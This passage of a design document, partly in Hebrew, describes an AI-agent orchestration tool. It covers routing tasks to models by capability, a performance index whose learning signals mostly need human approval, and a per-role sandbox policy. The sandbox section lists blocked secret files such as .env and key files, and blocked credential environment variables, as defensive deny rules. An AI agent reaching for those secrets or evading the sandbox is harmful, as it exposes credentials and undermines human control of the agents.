      error: `OGU3003: Capability '${capabilityId}' requires min tier ${capability.minTier}, ` +
             `but budget only allows tier ${targetTier}`,
      recommendation: 'escalate_budget'
    };
  }

  // 4. Find best model across providers
  const candidates = [];

  for (const [providerId, models] of Object.entries(registry.providerCapabilities)) {
    if (preferredProvider && providerId !== preferredProvider) continue;

    for (const [modelId, modelDef] of Object.entries(models)) {
      if (modelDef.tier > targetTier) continue; // over budget
      if (modelDef.tier < capability.minTier) continue; // under capability

      // Check trait coverage
      const missingTraits = capability.requiredTraits.filter(
        trait => !modelDef.traits.includes(trait)
      );

      candidates.push({
        providerId,
        modelId,
        tier: modelDef.tier,
        costFactor: modelDef.costFactor,
        traitCoverage: 1 - (missingTraits.length / capability.requiredTraits.length),
        missingTraits,
        strengths: modelDef.strengths,
        weaknesses: modelDef.weaknesses
      });
    }
  }

  if (candidates.length === 0) {
    return {
      resolved: false,
      error: `OGU3004: No model available for capability '${capabilityId}' at tier <= ${targetTier}`,
      recommendation: 'escalate_budget_or_change_provider'
    };
  }

  // 5. Score and rank candidates
  //    Priority: trait coverage > tier match > cost efficiency
  candidates.sort((a, b) => {
    if (a.traitCoverage !== b.traitCoverage) return b.traitCoverage - a.traitCoverage;
    if (a.tier !== b.tier) return b.tier - a.tier; // prefer higher tier
    return a.costFactor - b.costFactor; // prefer cheaper
  });

  const winner = candidates[0];

  if (winner.traitCoverage < 1.0) {
    // Partial match — log warning
    return {
      resolved: true,
      partial: true,
      provider: winner.providerId,
      model: winner.modelId,
      tier: winner.tier,
      missingTraits: winner.missingTraits,
      warning: `Model '${winner.modelId}' missing traits: ${winner.missingTraits.join(', ')}. ` +
               `Results may be lower quality.`
    };
  }

  return {
    resolved: true,
    partial: false,
    provider: winner.providerId,
    model: winner.modelId,
    tier: winner.tier,
    costFactor: winner.costFactor
  };
}

/**
 * Detect which capability a task requires based on task metadata
 */
export function detectCapability(task, phase) {
  // Heuristic mapping from task properties to capability
  if (phase === 'architect') return 'architect_review';
  if (phase === 'design') return 'design_review';

  const group = task.group?.toLowerCase() || '';
  const outputs = task.outputs || [];

  if (outputs.some(o => o.startsWith('TEST:'))) return 'test_generation';
  if (group.includes('security') || group.includes('audit')) return 'security_audit';
  if (group.includes('refactor')) return 'code_refactor';
  if (group.includes('spec') || group.includes('prd')) return 'spec_writing';

  return 'code_generation'; // default for build tasks
}

/**
 * Get all capabilities a specific model can handle
 */
export function modelCapabilities(root, providerId, modelId) {
  const registry = loadCapabilities(root);
  const modelDef = registry.providerCapabilities[providerId]?.[modelId];
  if (!modelDef) return [];

  return registry.capabilities.filter(cap =>
    cap.requiredTraits.every(trait => modelDef.traits.includes(trait)) &&
    modelDef.tier >= cap.minTier
  ).map(cap => cap.id);
}
```

**Updated Model Router integration:**

```javascript
// In model-router.mjs — replace direct role→model with role→capability→model

export function routeModel(input) {
  // ... existing code ...

  // NEW: Detect capability needed
  const capability = input.capabilityId || detectCapability(input.planTask, input.phase);

  // NEW: Resolve through capability registry
  const resolution = resolveCapability(root, {
    roleId: input.roleId,
    capabilityId: capability,
    budgetTier: targetTier,
    preferredProvider: null // or from orgSpec
  });

  if (!resolution.resolved) {
    // Capability mismatch — escalate
    return { error: resolution.error, recommendation: resolution.recommendation };
  }

  return {
    provider: resolution.provider,
    model: resolution.model,
    fullModelId: getFullModelId(resolution.provider, resolution.model),
    capability,
    tier: resolution.tier,
    partial: resolution.partial || false,
    warning: resolution.warning || null
  };
}
```

**CLI Commands:**

```
ogu capability:list                          ← List all capabilities with model coverage
ogu capability:test <capabilityId> <model>   ← Run benchmark for capability on model
ogu capability:bench                         ← Run all benchmarks, score models
ogu capability:matrix                        ← Show role→capability→model matrix
```

**Example:**
```
$ ogu capability:matrix
ROLE          CAPABILITY           MODEL (budget: tier 2)    TRAITS     COVERAGE
pm            spec_writing         claude-sonnet-4-6         ████████   100%
architect     architect_review     claude-sonnet-4-6         ██████░░   75% ⚠ missing: security
architect     architect_review     claude-opus-4-6           ████████   100% (over budget)
backend-dev   code_generation      claude-sonnet-4-6         ████████   100%
security      security_audit       claude-opus-4-6           ████████   100% (over budget)
security      security_audit       claude-sonnet-4-6         ██████░░   75% ⚠ missing: security_knowledge
qa            test_generation      claude-haiku-4-5          ██████░░   80%
qa            test_generation      claude-sonnet-4-6         ████████   100%
```

**כלל ברזל:** Model swap = שינוי ב-providerCapabilities בלבד. Role definitions, capabilities, ו-OrgSpec לא משתנים. זו ההבטחה של model-agnostic.

---

### Fix 7: Agent Performance Index (Learning Loop ארגוני)

**הבעיה:** יש audit trail, error codes, snapshots — אבל אין מנגנון שגורם למערכת **ללמוד ולהשתפר**. בלעדיו, אותם כשלונות חוזרים, אותם agents נבחרים למשימות שהם לא טובים בהם, ואותם models מבזבזים תקציב.

**קבצים חדשים:**

```
.ogu/performance/                               ← Performance data directory
.ogu/performance/index.json                      ← Aggregated performance metrics
.ogu/performance/history/YYYY-MM.jsonl           ← Monthly performance log
tools/ogu/commands/lib/performance-index.mjs     ← Metric collection & analysis
tools/ogu/commands/performance.mjs               ← CLI: performance:report, performance:trends, performance:optimize
docs/vault/02_Contracts/Performance.contract.md  ← Performance tracking contract
```

**Schema: Performance Index (per role, per capability, per model)**

```json
{
  "$schema": "PerformanceIndex/1.0",
  "lastUpdated": "ISO",
  "window": "30d",

  "byRole": {
    "backend-dev": {
      "totalTasks": 45,
      "successRate": 0.89,
      "avgTokensPerTask": 34567,
      "avgCostPerTask": 0.52,
      "avgRetriesPerTask": 0.3,
      "avgDurationMs": 45000,
      "escalationRate": 0.11,
      "byCapability": {
        "code_generation": {
          "tasks": 30,
          "successRate": 0.93,
          "avgTokens": 28000,
          "avgRetries": 0.1,
          "topFailureCodes": ["OGU0501", "OGU0302"]
        },
        "test_generation": {
          "tasks": 10,
          "successRate": 0.80,
          "avgTokens": 45000,
          "avgRetries": 0.6,
          "topFailureCodes": ["OGU0801"]
        },
        "code_refactor": {
          "tasks": 5,
          "successRate": 0.80,
          "avgTokens": 52000,
          "avgRetries": 0.4,
          "topFailureCodes": ["OGU0501"]
        }
      },
      "domainStrength": {
        "api_endpoints": 0.95,
        "database_schemas": 0.90,
        "auth_middleware": 0.70,
        "frontend_components": 0.60
      }
    }
  },

  "byModel": {
    "claude-sonnet-4-6": {
      "totalCalls": 120,
      "successRate": 0.88,
      "avgTokensIn": 25000,
      "avgTokensOut": 8000,
      "avgCost": 0.35,
      "avgLatencyMs": 1500,
      "byCapability": {
        "code_generation": { "successRate": 0.92, "avgTokens": 30000 },
        "security_audit": { "successRate": 0.65, "avgTokens": 55000 },
        "architect_review": { "successRate": 0.78, "avgTokens": 40000 }
      },
      "escalationTriggerRate": 0.12,
      "costEfficiency": 0.85
    },
    "claude-opus-4-6": {
      "totalCalls": 30,
      "successRate": 0.97,
      "avgTokensIn": 35000,
      "avgTokensOut": 12000,
      "avgCost": 2.10,
      "avgLatencyMs": 3000,
      "byCapability": {
        "security_audit": { "successRate": 0.98, "avgTokens": 45000 },
        "architect_review": { "successRate": 0.95, "avgTokens": 50000 }
      },
      "escalationTriggerRate": 0.03,
      "costEfficiency": 0.46
    }
  },

  "byFeature": {
    "auth-system": {
      "totalCost": 23.45,
      "totalTasks": 8,
      "successRate": 0.875,
      "escalations": 2,
      "gateFailures": 3,
      "topIssues": ["type_errors_in_middleware", "missing_test_coverage"]
    }
  },

  "learningSignals": [
    {
      "signal": "model_capability_mismatch",
      "description": "sonnet fails security_audit 35% of the time — consider routing to opus",
      "evidence": { "capability": "security_audit", "model": "sonnet", "failRate": 0.35, "sample": 20 },
      "recommendation": { "action": "update_min_tier", "capability": "security_audit", "newMinTier": 3 },
      "confidence": 0.85,
      "autoApplicable": false
    },
    {
      "signal": "role_domain_weakness",
      "description": "backend-dev struggles with auth_middleware tasks (70% success vs 95% for api_endpoints)",
      "evidence": { "role": "backend-dev", "weakDomain": "auth_middleware", "strongDomain": "api_endpoints" },
      "recommendation": { "action": "route_auth_tasks_to_security_role" },
      "confidence": 0.72,
      "autoApplicable": false
    },
    {
      "signal": "cost_efficiency_opportunity",
      "description": "haiku handles static_analysis at 95% success — no need for sonnet",
      "evidence": { "capability": "static_analysis", "model": "haiku", "successRate": 0.95 },
      "recommendation": { "action": "downgrade_default", "capability": "static_analysis", "newDefault": "haiku" },
      "confidence": 0.90,
      "autoApplicable": true
    }
  ]
}
```

**Pseudo-code: performance-index.mjs**

```javascript
// tools/ogu/commands/lib/performance-index.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { writeFileSync, appendFileSync, readdirSync, mkdirSync } from 'fs';
import { join } from 'path';

const INDEX_PATH = '.ogu/performance/index.json';
const HISTORY_DIR = '.ogu/performance/history';

/**
 * Record a task outcome for performance tracking
 * Called after every agent task completion (success or failure)
 */
export function recordOutcome(root, {
  roleId, capabilityId, model, featureSlug, taskId,
  success, tokensIn, tokensOut, cost, durationMs,
  retries, escalated, errorCode, domain
}) {
  const entry = {
    timestamp: new Date().toISOString(),
    roleId, capabilityId, model, featureSlug, taskId,
    success, tokensIn, tokensOut, cost, durationMs,
    retries, escalated, errorCode, domain
  };

  // Append to monthly history
  const month = entry.timestamp.slice(0, 7); // YYYY-MM
  mkdirSync(join(root, HISTORY_DIR), { recursive: true });
  appendFileSync(
    join(root, HISTORY_DIR, `${month}.jsonl`),
    JSON.stringify(entry) + '\n'
  );

  // Rebuild index (or update incrementally)
  updateIndex(root, entry);
}

/**
 * Rebuild the full performance index from history
 */
export function rebuildIndex(root, { windowDays = 30 } = {}) {
  const cutoff = new Date(Date.now() - windowDays * 86400000);
  const entries = loadHistoryAfter(root, cutoff);

  const index = {
    lastUpdated: new Date().toISOString(),
    window: `${windowDays}d`,
    byRole: {},
    byModel: {},
    byFeature: {},
    learningSignals: []
  };

  // Aggregate by role
  for (const entry of entries) {
    aggregateByRole(index, entry);
    aggregateByModel(index, entry);
    aggregateByFeature(index, entry);
  }

  // Calculate derived metrics
  for (const role of Object.values(index.byRole)) {
    role.successRate = role._successes / role.totalTasks;
    role.escalationRate = role._escalations / role.totalTasks;
    role.avgRetriesPerTask = role._totalRetries / role.totalTasks;
    calculateDomainStrength(role);
  }

  for (const model of Object.values(index.byModel)) {
    model.successRate = model._successes / model.totalCalls;
    model.costEfficiency = model.successRate / (model.avgCost || 1);
  }

  // Generate learning signals
  index.learningSignals = detectLearningSignals(index);

  writeFileSync(join(root, INDEX_PATH), JSON.stringify(index, null, 2));
  return index;
}

/**
 * Detect learning signals from performance data
 * These are actionable insights for improving routing
 */
function detectLearningSignals(index) {
  const signals = [];

  // Signal 1: Model-capability mismatch
  for (const [modelId, modelData] of Object.entries(index.byModel)) {
    for (const [capId, capData] of Object.entries(modelData.byCapability || {})) {
      if (capData.successRate < 0.70 && capData.tasks >= 5) {
        signals.push({
          signal: 'model_capability_mismatch',
          description: `${modelId} fails ${capId} ${Math.round((1 - capData.successRate) * 100)}% of the time`,
          evidence: { capability: capId, model: modelId, failRate: 1 - capData.successRate, sample: capData.tasks },
          recommendation: { action: 'update_min_tier', capability: capId, newMinTier: 3 },
          confidence: Math.min(0.95, capData.tasks / 20),
          autoApplicable: false
        });
      }
    }
  }

  // Signal 2: Role domain weakness
  for (const [roleId, roleData] of Object.entries(index.byRole)) {
    const domains = roleData.domainStrength || {};
    const avgStrength = Object.values(domains).reduce((a, b) => a + b, 0) / Math.max(Object.keys(domains).length, 1);

    for (const [domain, strength] of Object.entries(domains)) {
      if (strength < avgStrength * 0.75 && strength < 0.75) {
        signals.push({
          signal: 'role_domain_weakness',
          description: `${roleId} struggles with ${domain} (${Math.round(strength * 100)}% vs avg ${Math.round(avgStrength * 100)}%)`,
          evidence: { role: roleId, weakDomain: domain, strength },
          recommendation: { action: 'consider_reassignment' },
          confidence: 0.7,
          autoApplicable: false
        });
      }
    }
  }

  // Signal 3: Cost efficiency opportunity
  for (const [modelId, modelData] of Object.entries(index.byModel)) {
    for (const [capId, capData] of Object.entries(modelData.byCapability || {})) {
      if (capData.successRate >= 0.90 && modelData.avgCost < 0.10 && capData.tasks >= 10) {
        signals.push({
          signal: 'cost_efficiency_opportunity',
          description: `${modelId} handles ${capId} at ${Math.round(capData.successRate * 100)}% success — cheaper models work here`,
          evidence: { capability: capId, model: modelId, successRate: capData.successRate },
          recommendation: { action: 'downgrade_default', capability: capId, newDefault: modelId },
          confidence: Math.min(0.95, capData.tasks / 15),
          autoApplicable: true
        });
      }
    }
  }

  // Signal 4: Escalation waste
  for (const [roleId, roleData] of Object.entries(index.byRole)) {
    if (roleData.escalationRate > 0.20 && roleData.totalTasks >= 10) {
      signals.push({
        signal: 'high_escalation_rate',
        description: `${roleId} escalates ${Math.round(roleData.escalationRate * 100)}% of tasks — default model may be too weak`,
        evidence: { role: roleId, escalationRate: roleData.escalationRate },
        recommendation: { action: 'upgrade_default_model' },
        confidence: 0.80,
        autoApplicable: false
      });
    }
  }

  return signals;
}

/**
 * Apply a learning signal (update capability registry or model config)
 */
export function applySignal(root, signalIndex) {
  const index = loadIndex(root);
  const signal = index.learningSignals[signalIndex];
  if (!signal) throw new Error('OGU3101: Signal not found');
  if (!signal.autoApplicable && !signal._humanApproved) {
    throw new Error('OGU3102: Signal requires human approval before applying');
  }

  const rec = signal.recommendation;
  const capabilities = loadCapabilities(root);

  switch (rec.action) {
    case 'update_min_tier':
      const cap = capabilities.capabilities.find(c => c.id === rec.capability);
      if (cap) {
        cap.minTier = rec.newMinTier;
        saveCapabilities(root, capabilities);
      }
      break;

    case 'downgrade_default':
      // Update capability preferredTier or default model
      break;

    case 'upgrade_default_model':
      // Update role's model policy default
      break;
  }

  // Audit the learning application
  audit.emitAudit(root, {
    type: 'learning_applied',
    context: { signal: signal.signal, recommendation: rec, confidence: signal.confidence }
  });
}

/**
 * Detect domain from task properties
 */
function detectDomain(task) {
  const touches = (task.touches || []).join(' ').toLowerCase();
  if (touches.includes('auth') || touches.includes('security')) return 'auth_middleware';
  if (touches.includes('api') || touches.includes('route')) return 'api_endpoints';
  if (touches.includes('db') || touches.includes('schema') || touches.includes('prisma')) return 'database_schemas';
  if (touches.includes('component') || touches.includes('ui')) return 'frontend_components';
  if (touches.includes('test')) return 'test_suites';
  return 'general';
}
```

**CLI Commands:**

```
ogu performance:report [--role <id>] [--model <id>] [--days N]
ogu performance:trends [--capability <id>]
ogu performance:optimize [--apply] [--dry-run]
ogu performance:signals [--approve <index>]
```

**Example:**
```
$ ogu performance:report
PERFORMANCE REPORT (last 30 days):

BY ROLE:
  ROLE          TASKS   SUCCESS   AVG COST   ESCALATIONS   STRENGTH
  backend-dev   45      89%       $0.52      11%           api:95% db:90% auth:70%
  frontend-dev  30      87%       $0.48      13%           ui:92% api:78%
  qa            20      90%       $0.25      5%            tests:90%
  architect     8       88%       $4.50      12%           review:88%
  security      5       80%       $3.20      20%           audit:80%

BY MODEL:
  MODEL    CALLS   SUCCESS   AVG COST   EFFICIENCY
  haiku    50      82%       $0.03      27.3
  sonnet   120     88%       $0.35      2.5
  opus     30      97%       $2.10      0.5

LEARNING SIGNALS:
  ⚠ sonnet fails security_audit 35% — consider tier 3     [confidence: 85%]
  ⚠ backend-dev weak on auth_middleware (70%)              [confidence: 72%]
  ✓ haiku handles static_analysis at 95% — downgrade ok    [confidence: 90%, auto-applicable]
  ⚠ security escalates 20% of tasks — upgrade default      [confidence: 80%]

$ ogu performance:optimize --dry-run
PROPOSED OPTIMIZATIONS:
  1. [AUTO] static_analysis: downgrade preferred from sonnet→haiku (saves ~$0.30/call)
  2. [MANUAL] security_audit: upgrade minTier from 2→3 (requires human approval)
  3. [MANUAL] route auth tasks to security role when backend-dev assigned

  Estimated monthly savings: $15.40
  Run with --apply to execute auto-applicable changes.
```

**Integration with Model Router:**

```javascript
// In model-router.mjs — factor in performance data

const perf = loadPerformanceIndex(root);
const rolePerf = perf.byRole[input.roleId];
const modelPerf = perf.byModel[currentModel];

// If this model has low success rate for this capability, preemptively escalate
if (modelPerf?.byCapability?.[capability]?.successRate < 0.70) {
  targetTier = Math.min(targetTier + 1, 3);
  reason = 'performance_preemptive_escalation';
}
```

**כלל ברזל:** המערכת חייבת ללמוד. Performance Index מתעדכן אחרי כל task. Learning signals נבדקים ב-`ogu doctor`. Auto-applicable signals מיושמים ב-`ogu performance:optimize --apply`.

---

### Fix 8: Sandbox Policy Spec

**הבעיה:** Worktree isolation הוא ברמת git (branches) אבל לא ברמת OS. שני agents שמריצים `npm install` מקבלים את אותו `node_modules`. Agent שנגמר לו הזיכרון מפיל את כולם. Agent שיכול לגשת ל-`.env` רואה secrets שלא שייכים לו.

**קבצים חדשים:**

```
.ogu/sandbox-policy.json                        ← Sandbox rules per role
tools/ogu/commands/lib/sandbox.mjs               ← Sandbox enforcement
docs/vault/02_Contracts/Sandbox.contract.md      ← Sandbox policy contract
```

**Schema: sandbox-policy.json**

```json
{
  "$schema": "SandboxPolicy/1.0",

  "global": {
    "isolationLevel": "worktree | container | none",
    "defaultPolicy": "standard",
    "secretsHandling": {
      "envFileAccess": "deny_all | allowlist | passthrough",
      "allowedEnvVars": ["NODE_ENV", "PORT", "DATABASE_URL"],
      "blockedPatterns": ["*_KEY", "*_SECRET", "*_TOKEN", "*_PASSWORD"],
      "secretsVaultPath": ".ogu/secrets.enc"
    }
  },

  "policies": {
    "minimal": {
      "description": "Read-only access to project, no writes, no network, no secrets",
      "filesystem": {
        "readScope": ["src/**", "docs/**", "package.json", "tsconfig.json"],
        "writeScope": [],
        "blockedPaths": [".env*", ".ogu/secrets*", "*.pem", "*.key"],
        "tempDir": true
      },
      "network": {
        "outbound": "deny",
        "allowedHosts": [],
        "allowedPorts": []
      },
      "process": {
        "maxMemoryMb": 512,
        "maxCpuPercent": 25,
        "timeoutMs": 120000,
        "maxChildProcesses": 2
      },
      "tools": {
        "allowed": ["Read", "Glob", "Grep"],
        "blocked": ["Bash", "Write", "Edit"]
      },
      "applicableRoles": ["qa"]
    },

    "standard": {
      "description": "Read/write within ownership scope, limited network, no secrets",
      "filesystem": {
        "readScope": ["**/*"],
        "writeScope": ["${agent.ownershipScope}"],
        "blockedPaths": [".env*", ".ogu/secrets*", "*.pem", "*.key", ".ogu/OrgSpec.json", ".ogu/governance/**"],
        "tempDir": true
      },
      "network": {
        "outbound": "allowlist",
        "allowedHosts": ["localhost", "127.0.0.1"],
        "allowedPorts": [3000, 5173, 5432, 6379]
      },
      "process": {
        "maxMemoryMb": 2048,
        "maxCpuPercent": 50,
        "timeoutMs": 300000,
        "maxChildProcesses": 5
      },
      "tools": {
        "allowed": ["Read", "Write", "Edit", "Bash", "Glob", "Grep"],
        "blocked": []
      },
      "applicableRoles": ["backend-dev", "frontend-dev", "designer"]
    },

    "privileged": {
      "description": "Full access with auditing — for infra, security, and leadership",
      "filesystem": {
        "readScope": ["**/*"],
        "writeScope": ["**/*"],
        "blockedPaths": [".ogu/secrets*"],
        "tempDir": true
      },
      "network": {
        "outbound": "allow",
        "allowedHosts": ["*"],
        "allowedPorts": ["*"]
      },
      "process": {
        "maxMemoryMb": 4096,
        "maxCpuPercent": 80,
        "timeoutMs": 600000,
        "maxChildProcesses": 10
      },
      "tools": {
        "allowed": ["*"],
        "blocked": []
      },
      "auditLevel": "verbose",
      "applicableRoles": ["devops", "security", "tech-lead", "cto"]
    }
  },

  "rolePolicyOverrides": {
    "architect": {
      "basePolicy": "standard",
      "overrides": {
        "filesystem.readScope": ["**/*"],
        "filesystem.writeScope": ["docs/vault/**", ".ogu/**"],
        "tools.allowed": ["Read", "Write", "Edit", "Glob", "Grep", "WebSearch", "WebFetch"]
      }
    },
    "pm": {
      "basePolicy": "minimal",
      "overrides": {
        "filesystem.writeScope": ["docs/vault/04_Features/**"],
        "tools.allowed": ["Read", "Write", "Glob", "Grep", "WebSearch", "WebFetch"]
      }
    },
    "security": {
      "basePolicy": "privileged",
      "overrides": {
        "filesystem.readScope": ["**/*"],
        "filesystem.writeScope": [],
        "network.outbound": "deny",
        "auditLevel": "verbose"
      },
      "note": "Security role can read everything (including .env for audit) but cannot write or access network"
    }
  }
}
```

**Pseudo-code: sandbox.mjs**

```javascript
// tools/ogu/commands/lib/sandbox.mjs

import { readJsonSafe, repoRoot } from '../../util.mjs';
import { join, relative, resolve } from 'path';

const POLICY_PATH = '.ogu/sandbox-policy.json';

/**
 * Resolve the effective sandbox policy for a role
 */
export function resolveSandboxPolicy(root, roleId) {
  const config = loadSandboxConfig(root);
  const override = config.rolePolicyOverrides[roleId];

  if (override) {
    const base = { ...config.policies[override.basePolicy] };
    return deepMerge(base, override.overrides || {});
  }

  // Find policy by applicableRoles
  for (const [policyName, policy] of Object.entries(config.policies)) {
    if (policy.applicableRoles?.includes(roleId)) {
      return { ...policy, policyName };
    }
  }

  // Default to standard
  return { ...config.policies[config.global.defaultPolicy], policyName: 'standard' };
}

/**
 * Validate a file access against sandbox policy
 * Called before every Read/Write/Edit tool invocation
 */
export function validateFileAccess(root, roleId, filePath, mode = 'read') {
  const policy = resolveSandboxPolicy(root, roleId);
  const relPath = relative(root, resolve(root, filePath));

  // Check blocked paths (always checked first)
  const blockedPaths = policy.filesystem?.blockedPaths || [];
  for (const pattern of blockedPaths) {
    if (minimatch(relPath, pattern)) {
      return {
        allowed: false,
        reason: `OGU3201: Path '${relPath}' blocked by sandbox policy for role '${roleId}'`,
        policy: policy.policyName,
        pattern
      };
    }
  }

  // Check scope
  const scope = mode === 'read' ? policy.filesystem?.readScope : policy.filesystem?.writeScope;
  if (!scope || scope.length === 0) {
    return {
      allowed: false,
      reason: `OGU3202: Role '${roleId}' has no ${mode} permissions in sandbox policy`,
      policy: policy.policyName
    };
  }

  const inScope = scope.some(pattern => minimatch(relPath, pattern));
  if (!inScope) {
    return {
      allowed: false,
      reason: `OGU3203: Path '${relPath}' outside ${mode} scope for role '${roleId}'`,
      policy: policy.policyName,
      scope
    };
  }

  return { allowed: true };
}

/**
 * Validate a tool invocation against sandbox policy
 */
export function validateToolAccess(root, roleId, toolName) {
  const policy = resolveSandboxPolicy(root, roleId);

  const blocked = policy.tools?.blocked || [];
  if (blocked.includes(toolName)) {
    return {
      allowed: false,
      reason: `OGU3204: Tool '${toolName}' blocked for role '${roleId}'`
    };
  }

  const allowed = policy.tools?.allowed || [];
  if (allowed.includes('*') || allowed.includes(toolName)) {
    return { allowed: true };
  }

  return {
    allowed: false,
    reason: `OGU3205: Tool '${toolName}' not in allowlist for role '${roleId}'`
  };
}

/**
 * Validate a network request against sandbox policy
 */
export function validateNetworkAccess(root, roleId, host, port) {
  const policy = resolveSandboxPolicy(root, roleId);
  const net = policy.network || {};

  if (net.outbound === 'deny') {
    return { allowed: false, reason: `OGU3206: Network access denied for role '${roleId}'` };
  }

  if (net.outbound === 'allow') {
    return { allowed: true };
  }

  // Allowlist mode
  const hostAllowed = net.allowedHosts?.includes('*') || net.allowedHosts?.includes(host);
  const portAllowed = net.allowedPorts?.includes('*') || net.allowedPorts?.includes(port);

  if (!hostAllowed || !portAllowed) {
    return {
      allowed: false,
      reason: `OGU3207: Network ${host}:${port} not in allowlist for role '${roleId}'`,
      allowedHosts: net.allowedHosts,
      allowedPorts: net.allowedPorts
    };
  }

  return { allowed: true };
}

/**
 * Get process resource limits for a role
 */
export function getResourceLimits(root, roleId) {
  const policy = resolveSandboxPolicy(root, roleId);
  return policy.process || {
    maxMemoryMb: 2048,
    maxCpuPercent: 50,
    timeoutMs: 300000,
    maxChildProcesses: 5
  };
}

/**
 * Generate a filtered environment for agent execution
 * Strips all secrets, passes only allowed env vars
 */
export function buildSandboxEnv(root, roleId) {
  const config = loadSandboxConfig(root);
  const secrets = config.global.secretsHandling;
  const currentEnv = process.env;

  if (secrets.envFileAccess === 'deny_all') {
    // Only pass explicitly allowed vars
    const filtered = {};
    for (const key of secrets.allowedEnvVars || []) {
      if (currentEnv[key]) filtered[key] = currentEnv[key];
    }
    // Always pass PATH, HOME, SHELL for basic functionality
    filtered.PATH = currentEnv.PATH;
    filtered.HOME = currentEnv.HOME;
    filtered.SHELL = currentEnv.SHELL;
    return filtered;
  }

  if (secrets.envFileAccess === 'allowlist') {
    const filtered = { ...currentEnv };
    // Remove blocked patterns
    for (const key of Object.keys(filtered)) {
      for (const pattern of secrets.blockedPatterns || []) {
        if (minimatch(key, pattern)) {
          delete filtered[key];
          break;
        }
      }
    }
    return filtered;
  }

  // passthrough — dangerous, only for privileged roles
  return currentEnv;
}
```

**Integration with agent-runtime.mjs:**

```javascript
// Before executing agent task:

// 1. Validate sandbox policy
const sandbox = resolveSandboxPolicy(root, roleId);
const resourceLimits = getResourceLimits(root, roleId);

// 2. Build filtered environment
const sandboxEnv = buildSandboxEnv(root, roleId);

// 3. Validate task touches against write scope
for (const file of planTask.touches || []) {
  const access = validateFileAccess(root, roleId, file, 'write');
  if (!access.allowed) {
    return { success: false, reason: 'sandbox_violation', error: access.reason };
  }
}

// 4. Validate tools against policy
for (const tool of assignedAgent.allowedTools) {
  const access = validateToolAccess(root, roleId, tool);
  if (!access.allowed) {
    // Remove tool from agent's allowed list
    assignedAgent.allowedTools = assignedAgent.allowedTools.filter(t => t !== tool);
  }
}

// 5. Spawn with limits
const childProcess = spawn('claude', args, {
  cwd: worktreePath,
  env: sandboxEnv,
  timeout: resourceLimits.timeoutMs
});
```

**CLI Commands:**

```
ogu sandbox:policy [--role <id>]        ← Show effective sandbox policy for role
ogu sandbox:validate --role <id> --file <path> --mode read|write
ogu sandbox:env --role <id>             ← Show filtered env vars for role
ogu sandbox:check                       ← Validate all roles have sensible policies
```

**Example:**
```
$ ogu sandbox:policy --role backend-dev
SANDBOX POLICY: standard (for backend-dev)

  FILESYSTEM:
    Read:  **/* (all files)
    Write: src/api/**, src/lib/db/**  (ownership scope)
    Block: .env*, *.pem, *.key, .ogu/secrets*, .ogu/OrgSpec.json
    Temp:  ✓

  NETWORK:
    Outbound: allowlist
    Hosts:    localhost, 127.0.0.1
    Ports:    3000, 5173, 5432, 6379

  PROCESS:
    Memory:   2048 MB
    CPU:      50%
    Timeout:  5 min
    Children: 5

  TOOLS:
    Allowed: Read, Write, Edit, Bash, Glob, Grep
    Blocked: —

  ENV VARS:
    Passed: NODE_ENV, PORT, DATABASE_URL, PATH, HOME, SHELL
    Blocked: *_KEY, *_SECRET, *_TOKEN, *_PASSWORD

$ ogu sandbox:policy --role security
SANDBOX POLICY: privileged + overrides (for security)

  FILESYSTEM:
    Read:  **/* (ALL — including .env for audit)
    Write: NONE (read-only audit)
    Block: .ogu/secrets*

  NETWORK:
    Outbound: DENY (no external access)

  AUDIT: verbose (every file access logged)
```

**כלל ברזל:** שום agent לא מקבל `process.env` מלא. Secrets מסוננים תמיד. Write scope = ownership scope. חריגה = OGU3201-3207.

---

## סיכום: Error Codes חדשים (מורחב)

| Range | Domain |
|---|---|
| OGU2001-2099 | OrgSpec & Agent Registry |
| OGU2101-2199 | Model Router |
| OGU2201-2299 | Budget System |
| OGU2301-2399 | Audit Trail |
| OGU2401-2499 | Governance Engine |
| OGU2501-2599 | Kadima |
| OGU2601-2699 | Agent Runtime |
| OGU2701-2799 | Kadima ↔ Ogu Contract (Fix 1) |
| OGU2801-2899 | Feature State Machine (Fix 2) |
| OGU2901-2949 | Resource Governor (Fix 4) |
| OGU2951-2999 | Override System (Fix 5) |
| OGU3001-3099 | Capability Registry (Fix 6) |
| OGU3101-3199 | Performance Index (Fix 7) |
| OGU3201-3299 | Sandbox Policy (Fix 8) |
| OGU3301-3399 | SecretBroker (Stone 2) |
| OGU3401-3499 | Provenance & Attestations (Stone 3) |
| OGU3501-3599 | Runner Abstraction (Stone 6) |
| OGU3601-3699 | Policy AST & Determinism (Closure 1) |
| OGU3701-3799 | Feature Lifecycle v2 (Closure 2) |
| OGU3801-3899 | Feature Isolation (Closure 3) |
| OGU3901-3999 | Agent Identity (Closure 4) |
| OGU4001-4099 | KadimaAdapter (Enhancement 1) |
| OGU4101-4199 | Circuit Breakers (Closure 7) |
| OGU4201-4299 | System Halt/Resume (Closure 7) |
| OGU4301-4399 | Semantic Lock & AST Merge (Closure 9) |
| OGU4401-4499 | Knowledge Graph & RAG (Closure 10) |
| OGU4501-4599 | Functional Determinism (Closure 11) |
| OGU4601-4699 | MicroVM Execution (Closure 12) |
| OGU5001-5099 | Runner Execution (Topology 1) |
| OGU5101-5199 | File Locks (Topology 2) |
| OGU5201-5299 | Runner Pool (Topology 3) |
| OGU5301-5399 | Kadima Daemon (Topology 4) |
| OGU5401-5499 | IPC Protocol (Topology 3) |
| OGU5501-5599 | Task Queue (Topology 5) |
| OGU5601-5699 | Remote Runners (Milestone 3) |

---

## נספח: מיפוי Vision → Implementation

כל אחד מ-15 קבצי ה-Vision מכוסה:

| Vision Document | Phase | Implementation |
|---|---|---|
| `README.md` | All | Overall architecture realized across all 7 phases |
| `core/ARCHITECTURE.md` | 0, 6 | Agent registry + runtime engine |
| `core/WorkflowSpec.md` | 0, 5 | OrgSpec workflows + Kadima DAG execution |
| `agents/AgentIdentityModel.md` | 0 | OrgSpec roles schema with full identity fields |
| `agents/ExecutionProtocol.md` | 6 | agent-runtime.mjs executeAgentTask lifecycle |
| `models/ModelRouter.md` | 1 | model-router.mjs with escalation + multi-provider |
| `gates/GateEngine.md` | 3, 6 | Existing 14 gates + audit integration |
| `governance/DeterminismPolicy.md` | 3, 6 | determinism.mjs snapshot + replay + non-det logging |
| `governance/AuditTrail.md` | 3 | audit.mjs structured JSONL events |
| `budget/BudgetSystem.md` | 2 | budget-tracker.mjs with role/feature/model tracking |
| `runtime/ArtifactStore.md` | 6 | artifact-store.mjs structured storage |
| `runtime/WorktreeManager.md` | 5, 6 | worktree-manager.mjs lifecycle |
